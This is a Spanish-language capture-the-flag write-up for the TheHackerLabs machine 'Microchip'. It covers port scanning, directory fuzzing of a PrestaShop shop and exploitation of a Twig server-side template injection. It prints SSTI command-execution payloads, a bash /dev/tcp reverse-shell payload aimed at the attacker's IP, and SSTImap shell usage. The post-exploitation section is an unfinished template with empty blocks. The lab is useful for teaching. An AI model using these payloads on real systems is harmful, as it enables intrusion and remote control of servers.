---
layout: single
title: Microchip - TheHackerLabs
excerpt: "."
date: 2026-02-07
classes: wide
header:
  teaser: /assets/images/THL-writeup-microchip/microchip.png
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Linux
  - 
  - 
  - OSCP Style
---
![](/assets/images/THL-writeup-microchip/microchip.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.190
PING 192.168.100.190 (192.168.100.190) 56(84) bytes of data.
64 bytes from 192.168.100.190: icmp_seq=1 ttl=64 time=1.30 ms
64 bytes from 192.168.100.190: icmp_seq=2 ttl=64 time=1.01 ms
64 bytes from 192.168.100.190: icmp_seq=3 ttl=64 time=1.20 ms
64 bytes from 192.168.100.190: icmp_seq=4 ttl=64 time=0.971 ms

--- 192.168.100.190 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3941ms
rtt min/avg/max/mdev = 0.971/1.120/1.296/0.133 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<br>

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.190 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 14:13 -0600
Initiating ARP Ping Scan at 14:13
Scanning 192.168.100.190 [1 port]
Completed ARP Ping Scan at 14:13, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:13
Scanning 192.168.100.190 [65535 ports]
Discovered open port 80/tcp on 192.168.100.190
Discovered open port 22/tcp on 192.168.100.190
Discovered open port 3306/tcp on 192.168.100.190
Discovered open port 33060/tcp on 192.168.100.190
Discovered open port 9000/tcp on 192.168.100.190
Completed SYN Stealth Scan at 14:13, 18.54s elapsed (65535 total ports)
Nmap scan report for 192.168.100.190
Host is up, received arp-response (0.00069s latency).
Scanned at 2026-02-07 14:13:06 CST for 18s
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE    REASON
22/tcp    open  ssh        syn-ack ttl 64
80/tcp    open  http       syn-ack ttl 63
3306/tcp  open  mysql      syn-ack ttl 64
9000/tcp  open  cslistener syn-ack ttl 63
33060/tcp open  mysqlx     syn-ack ttl 64
MAC Address: XX (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.83 seconds
           Raw packets sent: 87493 (3.850MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

<br>

Hay varios puertos abiertos, pero me da curiosidad ver el **puerto 3306** abierto y desconozco los otros que aparecen.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 22,80,3306,9000,33060 192.168.100.190 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-07 14:13 -0600
Nmap scan report for 192.168.100.190
Host is up (0.0021s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Did not follow redirect to http://microchip.thl
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp  open  mysql   MySQL 8.0.42
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42
|   Thread ID: 11
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, ConnectWithDatabase, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, InteractiveClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, ODBCClient, LongColumnFlag, LongPassword, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: !ekFT\x18G\x171\x1EJ(W\x0Cv\x15\x12&&S
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-04-23T17:42:38
|_Not valid after:  2035-04-21T17:42:38
9000/tcp  open  http    Gophish httpd
|_http-title: Portainer
33060/tcp open  mysqlx  MySQL X protocol listener
MAC Address: XX (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

<br>

Gracias a este escaneo, obtenemos bastante información:
* Identificamos un dominio que se asocia a la página web activa en el **puerto 80**, siendo el dominio `microchip.thl`.
* Vemos el uso de lo que parece ser **Gophish o Portainer**, pero eso lo comprobaremos más adelante.
* Por último, vemos información sobre el **servicio MySQL** y vemos que en el **puerto 33060** se usa **MySQLx**.

Registremos el dominio en el `/etc/hosts`:
```bash
echo "192.168.100.190 microchip.thl" >> /etc/hosts
```
Vayamos a ver esa página web.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura1.png">
</p>

Parece ser una tienda de souvenirs.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura2.png">
</p>

Hay bastantes herramientas y entre ellas me llama la atención el uso de un **Ecommerce** llamado **PrestaShop**:

| **CMS PrestaShop** |
|:------------------:|
| *PrestaShop es un CMS de comercio electrónico (e-commerce), open-source, escrito principalmente en PHP y que usa MySQL/MariaDB como base de datos. Sirve para crear y gestionar tiendas online sin tener que programar todo desde cero.* |

<br>

Lo interesante es que navegando en la página, podemos ver el uso de muchos parámetros e incluso en algunas subpáginas.

También podemos registrarnos para crear una cuenta:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura3.png">
</p>

De momento no encontramos algo más, por lo que podemos aplicar **Fuzzing** e investigar vulnerabilidades sobre este CMS, pero veamos la página web del **puerto 9000**.

<br>

<h2 id="Puerto9k">Analizando Página Web del Puerto 9000</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura4.png">
</p>

Es un login para entrar al portal de **Portainer.io**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura5.png">
</p>

No hay mucho que destacar.

Investiguemos que es **Portainer.io**:

| **Portainer.io** |
|:----------------:|
| *Portainer es una herramienta web para administrar contenedores Docker (y también Docker Swarm y Kubernetes) desde una interfaz gráfica. En vez de manejar todo por CLI (docker ps, docker run, etc.), Portainer te da un panel visual para ver, crear y controlar contenedores, imágenes, volúmenes y redes.* |

<br>

Así que este login es para administrar contenedores de **Docker**.

Como no tenemos credenciales de acceso, dejemos este login para más adelante.

Apliquemos **Fuzzing** a la página web del **puerto 80**.

<br>

<h2 id="fuzz">Fuzzing</h2>

Primero utilicemos la herramienta **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt:FUZZ -u http://microchip.thl/FUZZ -t 300 -e .php,.txt,.html -mc 200,301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://microchip.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200,301,302
________________________________________________

templates               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 20ms]
modules                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 10ms]
themes                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 27ms]
bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 40ms]
cache                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 47ms]
docs                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 53ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 71ms]
download                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 71ms]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 75ms]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 72ms]
classes                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 69ms]
pdf                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 74ms]
tools                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 76ms]
mails                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 40ms]
translations            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 46ms]
index.php               [Status: 200, Size: 96542, Words: 24717, Lines: 2411, Duration: 314ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 16ms]
controllers             [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 6ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 42ms]
robots.txt              [Status: 200, Size: 2412, Words: 143, Lines: 83, Duration: 30ms]
webservice              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 65ms]
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 5130ms]
upload                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 5139ms]
var                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 5235ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 9832ms]
localization            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 40ms]
autoload.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
INSTALL.txt             [Status: 200, Size: 5001, Words: 1516, Lines: 90, Duration: 76ms]
Makefile                [Status: 200, Size: 824, Words: 51, Lines: 41, Duration: 30ms]
override                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 93ms]
index.php               [Status: 200, Size: 96542, Words: 24717, Lines: 2411, Duration: 483ms]
robots.txt              [Status: 200, Size: 2412, Words: 143, Lines: 83, Duration: 35ms]
error500.html           [Status: 200, Size: 2506, Words: 1189, Lines: 97, Duration: 116ms]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 319ms]
LICENSES                [Status: 200, Size: 183862, Words: 29187, Lines: 3257, Duration: 35ms]
:: Progress: [514492/514492] :: Job [1/1] :: 265 req/sec :: Duration: [0:03:57] :: Errors: 5 ::
```

| Parámetros | Descripción |
|--------------------------|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-e*	     | Para especificar una extensión a buscar. |
| *-mc*	     | Para aplicar un flitro que solo muestra resultados con un código de estado especifico. |

<br>

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://microchip.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 300 -x php,txt,html -s 200,301 -b "" --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://microchip.thl
[+] Method:         GET
[+] Threads:        300
[+] Wordlist:       /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt
[+] Status codes:   200,301
[+] User Agent:     gobuster/3.8.2
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
templates            (Status: 301) [Size: 318] [--> http://microchip.thl/templates/]
upload               (Status: 301) [Size: 315] [--> http://microchip.thl/upload/]
app                  (Status: 301) [Size: 312] [--> http://microchip.thl/app/]
pdf                  (Status: 301) [Size: 312] [--> http://microchip.thl/pdf/]
tools                (Status: 301) [Size: 314] [--> http://microchip.thl/tools/]
classes              (Status: 301) [Size: 316] [--> http://microchip.thl/classes/]
var                  (Status: 301) [Size: 312] [--> http://microchip.thl/var/]
javascript           (Status: 301) [Size: 319] [--> http://microchip.thl/javascript/]
index.php            (Status: 200) [Size: 96542]
mails                (Status: 301) [Size: 314] [--> http://microchip.thl/mails/]
translations         (Status: 301) [Size: 321] [--> http://microchip.thl/translations/]
js                   (Status: 301) [Size: 311] [--> http://microchip.thl/js/]
cache                (Status: 301) [Size: 314] [--> http://microchip.thl/cache/]
src                  (Status: 301) [Size: 312] [--> http://microchip.thl/src/]
controllers          (Status: 301) [Size: 320] [--> http://microchip.thl/controllers/]
modules              (Status: 301) [Size: 316] [--> http://microchip.thl/modules/]
docs                 (Status: 301) [Size: 313] [--> http://microchip.thl/docs/]
vendor               (Status: 301) [Size: 315] [--> http://microchip.thl/vendor/]
robots.txt           (Status: 200) [Size: 2412]
webservice           (Status: 301) [Size: 319] [--> http://microchip.thl/webservice/]
themes               (Status: 301) [Size: 315] [--> http://microchip.thl/themes/]
bin                  (Status: 301) [Size: 312] [--> http://microchip.thl/bin/]
localization         (Status: 301) [Size: 321] [--> http://microchip.thl/localization/]
autoload.php         (Status: 200) [Size: 0]
INSTALL.txt          (Status: 200) [Size: 5001]
Makefile             (Status: 200) [Size: 824]
override             (Status: 301) [Size: 317] [--> http://microchip.thl/override/]
robots.txt           (Status: 200) [Size: 2412]
index.php            (Status: 200) [Size: 96540]
error500.html        (Status: 200) [Size: 2506]
LICENSES             (Status: 200) [Size: 183862]
Progress: 514492 / 514492 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|--------------------------|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para especificar una extensión a buscar. |
| *-s*	     | Para aplicar un filtro que muestre solo los códigos de estado específicos. |
| *-b*	     | Para que funcione el filtro anterior. |
| *--ne*     | Para que no muestre errores. |

<br>

Encontramos bastantes resultados, pero solamente enfoquemonos en los siguientes.

Si vemos el archivo **INSTALL.txt**, veremos la versión que se esta usando de **PrestaShop**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura6.png">
</p>

También podemos ver el archivo **robots.txt**, en donde encontraremos los parámetros que ocupa la página:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura7.png">
</p>

Algo interesante que podemos encontrar es el directorio `/src` en donde podremos ver donde se guarda toda la instalación del CMS:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura8.png">
</p>

Y si entramos al directorio **PrestaShopBundle**, veremos un directorio llamado **Twig**:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura9.png">
</p>

Investiguemos que es **Twig**:

| **Twig** |
|:--------:|
| *Twig es un motor de plantillas para PHP. Su trabajo es generar HTML mezclando plantillas con datos, de forma segura y ordenada. Similar a Jinja2, solo que este último es enfocado en Python.* |

<br>

Al ver que es un motor de plantillas, puede que sea vulnerable a **Server Side Template Injection (SSTI)**, lo que nos permitiria ejecutar comandos dentro de la página.

La cuestión es saber donde se puede probar, por lo que tendremos que buscar en toda la página web algún campo o parámetro vulnerable.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="SSTI">Identificando Campo Vulnerable a Server Side Template Injection (SSTI)</h2>

Revisando los campos donde podemos insertar texto en la página web, encontramos el siguiente que parece reproducir lo que escribimos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura10.png">
</p>

Es bastante extraño este campo, ya que no es una funcionalidad común que puedas poner a una página web.

Puede que aquí podamos ejecutar el **SSTI**, así que probemos lo siguiente:

{% raw %}
```bash
{{7*7}}
```
{% endraw %}

Probemos:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura11.png">
</p>

Funciona, hemos encontrado un **SSTI**.

Podemos seguir jugando con este campo, utilizando los payloads del siguiente repositorio:
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md#twig" target="_blank">Repositorio de swisskyrepo: Server Side Template Injection - PHP (Twig)</a>

Pero curiosamente, casi todos los payloads no parecen funcionar, a excepción de las siguientes:

{% raw %}
```bash
{{7*7}}
{{dump(app)}}
{{dump(_context)}}
```
{% endraw %}

Aunque si utilizamos el siguiente payload, funcionara y veremos que se ejecuta el comando:

{% raw %}
```bash
{{system('id')}}
```
{% endraw %}

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura12.png">
</p>

Entonces, vamos a enviarnos una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza el siguiente payload:

{% raw %}
```bash
{{system("bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'")}}
```
{% endraw %}

Pruebala:

<p align="center">
<img src="/assets/images/THL-writeup-microchip/Captura13.png">
</p>

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.100.190] 33364
bash: cannot set terminal process group (27): Inappropriate ioctl for device
bash: no job control in this shell
www-data@62ca60255545:/var/www/prestashop$ whoami
whoami
www-data
```
Estamos dentro.

<br>

<h2 id="SSTIauto">Utilizando Herramienta SSTImap para Identificar y Explotar Server Side Template Inyection (SSTI)</h2>

Existe una herramienta llamada SSTImap que sirve para identificar y explotar **SSTI**.

Aquí la puedes encontrar:
* <a href="https://github.com/vladko312/SSTImap/tree/master" target="_blank">Repositorio de vladko312: SSTImap</a>

Para utilizarla, deberas clonar el repositorio e instalar los requerimientos de la herramienta.

Puedes hacerlo de la siguiente forma:
```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Con lo anterior hecho, ejecutamos **SSTImap**:
```bash
python3 sstimap.py

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 6; generic: 5; php: 3; ruby: 2; python: 4; java: 4; javascript: 6
[*] Loaded request body types: 6

[-] SSTImap requires target URL (-u, --url), URLs/forms file (--load-urls / --load-forms) or interactive mode (-i, --interactive)
```
Funciona correctamente.

Para el uso de esta herramienta, debemos identificar un parámetro que pueda probar.

Digamos que no hemos identificado un parámetro vulnerable y queremos probar varios, entonces debemos generar una lista como la siguiente:
```bash
cat requests.txt
http://microchip.thl/index.php?order=test
http://microchip.thl/index.php?tag=test
http://microchip.thl/index.php?id_currency=test
http://microchip.thl/index.php?search_query=test
http://microchip.thl/index.php?back=test
http://microchip.thl/index.php?n=test
http://microchip.thl/index.php?controller=test
http://microchip.thl/index.php?fc=test
http://microchip.thl/index.php?user_input=test
```
Todos estos parámetros los encuentras dentro de la página.

Utilizamos la herramienta y le indicamos que pruebe todas las URLs que guardamos:
```bash
python3 sstimap.py --load-urls requests.txt

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
[!] LEGAL DISCLAIMER: Usage of SSTImap for attacking targets without prior mutual consent is illegal.
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] Loaded plugins by categories: languages: 6; generic: 5; php: 3; ruby: 2; python: 4; java: 4; javascript: 6
[*] Loaded request body types: 6
...
[+] Php_generic plugin has confirmed injection with tag '{*}' 
[+] SSTImap identified the following injection point:

  Query parameter: user_input
  Engine: Php_generic
  Injection: {*}
  Context: text
  OS: Linux
  Technique: rendered
  Capabilities:

    Shell command execution: ok
    Bind and reverse shell: ok
    File write: ok
    File read: ok
    Code evaluation: ok, php code

[+] Rerun SSTImap providing one of the following options:
    --interactive                Run SSTImap in interactive mode to switch between exploitation modes without losing progress.
    --os-shell                   Prompt for an interactive operating system shell.
    --os-cmd                     Execute an operating system command.
    --eval-shell                 Prompt for an interactive shell on the template engine base language.
    --eval-cmd                   Evaluate code in the template engine base language.
    --tpl-shell                  Prompt for an interactive shell on the template engine.
    --tpl-cmd                    Inject code in the template engine.
    --bind-shell PORT            Connect to a shell bind to a target port.
    --reverse-shell HOST PORT    Send a shell back to the attacker's port.
    --upload LOCAL REMOTE        Upload files to the server.
    --download REMOTE LOCAL      Download remote files.
```
Excelente, identifico un parámetro vulnerable, siendo la URL `http://microchip.thl/index.php?user_input=test` y te da una lista de los comandos que puedes utilizar.

Obtengamos una shell interactiva:
```bash
python3 sstimap.py -u http://microchip.thl/index.php?user_input=test --os-shell

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.3.2
[*] Author: @vladko312
[*] Based on Tplmap
...
[+] Run commands on the operating system.
Linux $ whoami
www-data
```
Estamos dentro.

Puedes seguir con esta sesión o con la primera que obtuvimos, yo seguire con la primera.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```

<br>

<h2 id=""></h2>

```bash

```

```bash

```

```bash

```

```bash

```



<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


* https://medium.com/@bootstrapsecurity/server-side-template-injection-ssti-advanced-exploitation-techniques-2d8ccdf6270f
* https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
* https://github.com/vladko312/SSTImap
* https://gtfobins.org/gtfobins/iptables-save/
* 
* 


<br>

# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
